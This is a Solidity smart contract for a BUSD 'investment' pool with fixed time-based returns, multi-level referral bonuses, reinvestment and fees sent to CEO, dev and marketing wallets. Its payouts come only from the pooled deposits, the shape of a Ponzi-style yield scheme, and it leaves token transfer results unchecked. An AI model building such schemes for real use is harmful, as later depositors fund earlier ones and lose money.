// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "./MonsterBUSD_State.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


contract MonsterBUSD is MonsterBUSD_State, ReentrancyGuard {
	using SafeMath for uint;
	IERC20 public token;//0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56 - busd
	event Newbie(address user);
	event NewDeposit(address indexed user, uint amount);
	event Withdrawn(address indexed user, uint amount);
	event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
	event FeePayed(address indexed user, uint totalAmount);
	event Reinvestment(address indexed user, uint amount);
	address private _defaultWallet;

	event ForceWithdraw(address indexed user, uint amount);
	constructor(address devAddr, address marketingAddr, address ceoWallet, address _defWallet, address _token) {
		devAddress = devAddr;
		marketingAdress = marketingAddr;
		ceo_wallet = ceoWallet;
		_defaultWallet = _defWallet;
		token = IERC20(_token);
		setPlans();
		emit Paused(msg.sender);
	}

	modifier checkUser_() {
		uint check = block.timestamp.sub(getlastActionDate(users[msg.sender]));
		require(check > TIME_STEP, "try again later");
		_;
	}

	function checkUser() external view returns (bool){
		uint check = block.timestamp.sub(getlastActionDate(users[msg.sender]));
		if(check > TIME_STEP) {
			return true;
		}
		return false;
	}

	function invest(uint investAmt, address referrer) external nonReentrant whenNotPaused {
		transferHandler(msg.sender, address(this), investAmt);
		investHandler(investAmt, referrer);
	}

	function investHandler(uint investAmt, address referrer) internal {
		uint plan = 0;
		require(investAmt >= INVEST_MIN_AMOUNT, "insufficient deposit");
		require(plan < plans.length, "invalid plan");
		payFeeInvest(investAmt);

		User storage user = users[msg.sender];

		if (user.referrer == address(0) && users[referrer].depositsLength > 0 && referrer != msg.sender) {
			user.referrer = referrer;
		}

		address upline;

		if (user.referrer != address(0)) {
			upline = user.referrer;
		} else {
			upline = devAddress;
		}

	for(uint i; i < REFERRAL_PERCENTS.length; i++) {
		if(upline != address(0)) {
			uint amount = (investAmt.mul(REFERRAL_PERCENTS[i])).div(PERCENTS_DIVIDER);
			//users[upline].bonus += amount;
			transferHandler(address(this), upline, amount);
			users[upline].totalBonus += amount;
			if(user.depositsLength == 0)
				users[upline].referrerCount[i] += 1;
			users[upline].referrerBonus[i] += amount;
			emit RefBonus(upline, msg.sender, i, amount);
			upline = users[upline].referrer;
			if(upline == address(0)) {
				upline = _defaultWallet;
			}
		} else break;
	}


		if (user.depositsLength == 0) {
			user.checkpoint = block.timestamp;
			totalUsers++;
			emit Newbie(msg.sender);
		}

		Deposit memory newDeposit;
		newDeposit.plan = plan;
		newDeposit.amount = investAmt;
		newDeposit.start = block.timestamp;
		user.deposits[user.depositsLength] = newDeposit;
		user.depositsLength++;
		user.totalStake += investAmt;

		totalInvested += investAmt;
		totalDeposits += 1;
		emit NewDeposit(msg.sender, investAmt);
	}

	function withdraw() external whenNotPaused checkUser_ returns(bool) {
		require(isActive(msg.sender), "Dont is User");
		User storage user = users[msg.sender];

		uint totalAmount;

		for(uint i; i < user.depositsLength; i++) {
			uint dividends;
			Deposit memory deposit = user.deposits[i];

			if(deposit.withdrawn < getMaxprofit(deposit) && deposit.force == false) {
				dividends = calculateDividents(deposit, user, totalAmount);

				if(dividends > 0) {
					user.deposits[i].withdrawn += dividends; /// changing of storage data
					totalAmount += dividends;
				}
			}
		}

		require(totalAmount >= MIN_WITHDRAW, "User has no dividends");

		uint referralBonus = user.bonus;
		if(referralBonus > 0) {
			totalAmount += referralBonus;
			delete user.bonus;
		}

		uint contractBalance = getContractBalance();
		if(contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}

		user.checkpoint = block.timestamp;

		totalWithdrawn += totalAmount;
		uint256 fee = totalAmount.mul(WITHDRAW_FEE_PERCENT).div(PERCENTS_DIVIDER);
		uint256 toTransfer = totalAmount.sub(fee);
		payFees(fee);
		transferHandler(address(this), msg.sender, toTransfer);
		emit FeePayed(msg.sender, fee);
		emit Withdrawn(msg.sender, totalAmount);
		return true;

	}

	function reinvestment() external whenNotPaused checkUser_ nonReentrant returns(bool) {
		require(isActive(msg.sender), "Dont is User");
		User storage user = users[msg.sender];

		uint totalDividends;

		for(uint i; i < user.depositsLength; i++) {
			uint dividends;
			Deposit memory deposit = user.deposits[i];

			if(deposit.withdrawn < getMaxprofit(deposit) && deposit.force == false) {
				dividends = calculateDividents(deposit, user, totalDividends);

				if(dividends > 0) {
					user.deposits[i].withdrawn += dividends;
					totalDividends += dividends;
				}
			}
		}

		require(totalDividends > 0, "User has no dividends");

		uint referralBonus = user.bonus;
		if(referralBonus > 0) {
			totalDividends += referralBonus;
			delete user.bonus;
		}

		user.reinvest += totalDividends;
		totalReinvested += totalDividends;
		totalWithdrawn += totalDividends;
		user.checkpoint = block.timestamp;
		investHandler(totalDividends, user.referrer);
		return true;
	}

    function forceWithdraw() external whenNotPaused nonReentrant {
        User storage user = users[msg.sender];
		uint totalDividends;
		uint toFee;
		for(uint256 i; i < user.depositsLength; i++) {
			Deposit storage deposit = user.deposits[i];
			if(deposit.force == false) {
				deposit.force = true;
				uint maxProfit = getMaxprofit(deposit);
				if(deposit.withdrawn < maxProfit) {
					uint profit = maxProfit.sub(deposit.withdrawn);
					deposit.withdrawn = deposit.withdrawn.add(profit);
					totalDividends += profit;
					toFee += deposit.amount.sub(profit, "sub error");
				}
			}

		}
		require(totalDividends > 0, "User has no dividends");
		uint256 contractBalance = getContractBalance();
		if(contractBalance < totalDividends + toFee) {
			totalDividends = contractBalance.mul(FORCE_WITHDRAW_PERCENT).div(PERCENTS_DIVIDER);
			toFee = contractBalance.sub(totalDividends, "sub error 2");
		}
		user.checkpoint = block.timestamp;
		payFees(toFee);
		transferHandler(address(this), msg.sender, totalDividends);
		emit FeePayed(msg.sender, toFee);
		emit ForceWithdraw(msg.sender, totalDividends);
    }

	function getNextUserAssignment(address userAddress) public view returns (uint) {
		uint checkpoint = getlastActionDate(users[userAddress]);
		uint _date = getContracDate();
		if(_date > checkpoint)
			checkpoint = _date;
		return checkpoint.add(TIME_STEP);
	}

	function getPublicData() external view returns(uint totalUsers_,
		uint totalInvested_,
		uint totalReinvested_,
		uint totalWithdrawn_,
		uint totalDeposits_,
		uint balance_,
		// uint roiBase,
		// uint maxProfit,
		uint minDeposit,
		uint daysFormdeploy
		) {
		totalUsers_ = totalUsers;
		totalInvested_ = totalInvested;
		totalReinvested_ = totalReinvested;
		totalWithdrawn_ = totalWithdrawn;
		totalDeposits_ = totalDeposits;
		balance_ = getContractBalance();
		// roiBase = ROI_BASE;
		// maxProfit = MAX_PROFIT;
		minDeposit = INVEST_MIN_AMOUNT;
		daysFormdeploy = (block.timestamp.sub(getContracDate())).div(TIME_STEP);
	}

	function getUserData(address userAddress) external view returns(uint totalWithdrawn_,
		uint totalDeposits_,
		uint totalBonus_,
		uint totalReinvest_,
		uint balance_,
		uint nextAssignment_,
		uint amountOfDeposits,
		uint checkpoint,
		bool isUser_,
		address referrer_,
		uint[REFERRAL_LEGNTH] memory referrerCount_,
		uint[REFERRAL_LEGNTH] memory referrerBonus_
	){
		User storage user = users[userAddress];
		totalWithdrawn_ = getUserTotalWithdrawn(userAddress);
		totalDeposits_ = getUserTotalDeposits(userAddress);
		nextAssignment_ = getNextUserAssignment(userAddress);
		balance_ = getUserDividends(userAddress);
		totalBonus_ = user.bonus;
		totalReinvest_ = user.reinvest;
		amountOfDeposits = user.depositsLength;


		checkpoint = getlastActionDate(user);
		isUser_ = user.depositsLength > 0;
		referrer_ = user.referrer;
		referrerCount_ = user.referrerCount;
		referrerBonus_= user.referrerBonus;
	}

	function getContractBalance() public view returns (uint) {
		return token.balanceOf(address(this));
	}

	function getUserDividends(address userAddress) internal view returns (uint) {
		User storage user = users[userAddress];

		uint totalDividends;

		for(uint i; i < user.depositsLength; i++) {

			Deposit memory deposit = users[userAddress].deposits[i];

			if(deposit.withdrawn < getMaxprofit(deposit) && deposit.force == false) {
				uint dividends = calculateDividents(deposit, user, totalDividends);
				totalDividends += dividends;
			}

		}

		return totalDividends;
	}

	function calculateDividents(Deposit memory deposit, User storage user, uint) internal view returns (uint) {
		uint dividends;
		uint depositPercentRate = plans[deposit.plan].percent;

		uint checkDate = getDepsitStartDate(deposit);

		if(checkDate < getlastActionDate(user)) {
			checkDate = getlastActionDate(user);
		}

		dividends = (deposit.amount
		.mul(depositPercentRate.mul(block.timestamp.sub(checkDate))))
		.div((PERCENTS_DIVIDER).mul(TIME_STEP))
		;


		/*
		if(dividends + _current > userMaxProfit) {
			dividends = userMaxProfit.sub(_current, "max dividends");
		}
		*/

		if(deposit.withdrawn.add(dividends) > getMaxprofit(deposit)) {
			dividends = getMaxprofit(deposit).sub(deposit.withdrawn);
		}

		return dividends;

	}

	function isActive(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

		if (user.depositsLength > 0) {
			if(users[userAddress].deposits[user.depositsLength-1].withdrawn < getMaxprofit(users[userAddress].deposits[user.depositsLength-1])) {
				return true;
			}
		}
		return false;
	}

	function getUserDepositInfo(address userAddress, uint index) external view returns(
		uint plan_,
		uint amount_,
		uint withdrawn_,
		uint timeStart_,
		uint maxProfit
		) {
		Deposit memory deposit = users[userAddress].deposits[index];
		amount_ = deposit.amount;
		plan_ = deposit.plan;
		withdrawn_ = deposit.withdrawn;
		timeStart_= getDepsitStartDate(deposit);
		maxProfit = getMaxprofit(deposit);
	}


	function getUserTotalDeposits(address userAddress) internal view returns(uint) {
		User storage user = users[userAddress];
		uint amount;
		for(uint i; i < user.depositsLength; i++) {
			amount += users[userAddress].deposits[i].amount;
		}
		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) internal view returns(uint) {
		User storage user = users[userAddress];

		uint amount;

		for(uint i; i < user.depositsLength; i++) {
			amount += users[userAddress].deposits[i].withdrawn;
		}
		return amount;
	}

	function getlastActionDate(User storage user) internal view returns(uint) {
		uint checkpoint = user.checkpoint;
		uint _date = getContracDate();
		if(_date > checkpoint)
			checkpoint = _date;
		return checkpoint;
	}

	function isContract(address addr) internal view returns (bool) {
		uint size;
		assembly { size := extcodesize(addr) }
		return size > 0;
	}

	function getDepsitStartDate(Deposit memory ndeposit) private view returns(uint) {
		uint _date = getContracDate();
		if(_date > ndeposit.start) {
			return _date;
		} else {
			return ndeposit.start;
		}
	}

	function transferHandler(address from, address to, uint amount) internal {
		if(from == address(this)) {
			if(amount > getContractBalance()) {
				amount = getContractBalance();
			}
			token.transfer(to, amount);
		}
		else {
			token.transferFrom(from, to, amount);
		}
	}

	//1000
	function payFeeInvest(uint amount) internal {
		//4%
		uint fee1 = amount.mul(50).div(PERCENTS_DIVIDER);
		uint fee2 = amount.mul(40).div(PERCENTS_DIVIDER);
		uint fee3 = amount.mul(20).div(PERCENTS_DIVIDER);
		transferHandler(address(this), ceo_wallet, fee1);
		transferHandler(address(this), devAddress, fee2);
		transferHandler(address(this), marketingAdress, fee3);
		emit FeePayed(msg.sender, fee1+fee2+fee3);
	}

	function payFees(uint amount) internal {
		uint fee1 = amount.div(3);
		transferHandler(address(this), marketingAdress, fee1);
		transferHandler(address(this), ceo_wallet, fee1);
		transferHandler(address(this), devAddress, amount.sub(fee1).sub(fee1));
		emit FeePayed(msg.sender, fee1+fee1+fee1);
	}


}